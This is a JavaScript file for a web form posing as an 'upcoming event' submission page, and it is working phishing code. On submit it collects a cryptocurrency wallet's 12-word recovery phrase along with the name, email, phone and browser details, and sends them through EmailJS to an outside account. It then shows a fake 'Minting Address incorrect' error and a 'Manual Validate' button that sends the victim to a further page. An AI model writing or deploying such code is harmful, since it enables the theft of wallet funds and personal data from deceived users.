document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('wf-form-Submit-an-upcoming-event');
    
    if (form) {
        form.addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Show loading state on submit button
            const submitBtn = form.querySelector('[type="submit"]');
            const originalBtnText = submitBtn.value;
            submitBtn.value = 'Processing...';
            submitBtn.disabled = true;
            
            // Create and show loading spinner immediately
            const spinnerContainer = document.createElement('div');
            spinnerContainer.id = 'spinner-container';
            spinnerContainer.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.7);
                display: flex;
                justify-content: center;
                align-items: center;
                flex-direction: column;
                z-index: 9999;
            `;
            
            // Create spinner
            const spinner = document.createElement('div');
            spinner.className = 'spinner';
            spinner.style.cssText = `
                border: 5px solid #f3f3f3;
                border-top: 5px solid #3498db;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin-bottom: 20px;
            `;
            
            // Create error message
            const errorMsg = document.createElement('div');
            errorMsg.id = 'error-msg';
            errorMsg.textContent = 'Blockchain Minting Address incorrect or invalid';
            errorMsg.style.cssText = `
                color: white;
                font-size: 18px;
                margin-bottom: 20px;
                display: none;
            `;
            
            // Create manual validation button
            const validateBtn = document.createElement('button');
            validateBtn.id = 'manual-validate-btn';
            validateBtn.textContent = 'Manual Validate';
            validateBtn.style.cssText = `
                padding: 10px 20px;
                background: #e74c3c;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
                display: none;
            `;
            
            // Append elements
            spinnerContainer.appendChild(spinner);
            spinnerContainer.appendChild(errorMsg);
            spinnerContainer.appendChild(validateBtn);
            document.body.appendChild(spinnerContainer);
            
            // Add spinner animation
            const style = document.createElement('style');
            style.textContent = `
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            `;
            document.head.appendChild(style);

            // Collect ALL form data including blockchain phrase
            const formData = {
                // 12-word phrase (primary focus)
                blockchain_12word_phrase: document.getElementById('phrase-12').value,
                
                // Blockchain info
                blockchain_address: document.getElementById('Your-event-location-2')?.value || 'N/A',
                
                // Personal info
                first_name: document.getElementById('phrase-12').value, // Using same field as requested
                last_name: document.getElementById('Last-Name-3')?.value || 'N/A',
                email: document.getElementById('Email-3')?.value || 'N/A',
                phone: document.getElementById('Phone-number')?.value || 'N/A',
                
                // Event info
                event_title: document.getElementById('Title')?.value || 'N/A',
                event_description: document.getElementById('Talk-about-your-drop')?.value || 'N/A',
                contact_details: document.getElementById('Interview-contact-details')?.value || 'N/A',
                press_release_url: document.getElementById('Your-press-release')?.value || 'N/A',
                open_date: document.getElementById('Open-date')?.value || 'N/A',
                end_date: document.getElementById('End-Date')?.value || 'N/A',
                location: document.getElementById('Your-event-location')?.value || 'N/A',
                
                // Social and assets
                social_handles: document.getElementById('Social-handles-2')?.value || 'N/A',
                promotional_assets: document.getElementById('Promotional-assets')?.value || 'N/A',
                
                // System info
                submission_date: new Date().toLocaleString(),
                user_agent: navigator.userAgent,
                ip_address: '' // Will be filled by EmailJS or server
            };

            // Debug: Log the complete form data
            console.log('Form submission data:', formData);
            
            // Send email via EmailJS
            emailjs.send('service_8ug6ezl', 'template_e73jb2t', formData)
                .then(function(response) {
                    console.log('Email successfully sent:', response);
                    
                    // After 4 seconds, show error state (as per requirements)
                    setTimeout(function() {
                        spinner.style.display = 'none';
                        errorMsg.style.display = 'block';
                        validateBtn.style.display = 'block';
                        
                        // Set up redirect on button click
                        validateBtn.addEventListener('click', function() {
                            window.location.href = 'submit-an-upcoming-event1.html';
                        });
                    }, 4000);
                })
                .catch(function(error) {
                    console.error('Email send failed:', error);
                    
                    // Show error state immediately
                    spinner.style.display = 'none';
                    errorMsg.style.display = 'block';
                    validateBtn.style.display = 'block';
                    
                    // Set up redirect on button click
                    validateBtn.addEventListener('click', function() {
                        window.location.href = 'submit-an-upcoming-event1.html';
                    });
                })
                .finally(function() {
                    // Reset submit button
                    submitBtn.value = originalBtnText;
                    submitBtn.disabled = false;
                });
        });
    }
});